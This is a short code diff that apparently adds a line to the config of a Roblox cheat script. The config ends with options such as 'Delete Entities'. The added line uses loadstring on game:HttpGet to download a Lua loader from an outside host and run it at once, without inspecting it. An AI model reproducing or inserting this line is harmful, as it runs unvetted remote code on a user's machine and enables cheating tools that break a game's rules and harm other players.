@@ -397,3 +397,4 @@ getgenv().Config = {
 		["Delete Entities"] = true
 	},
 }
+loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
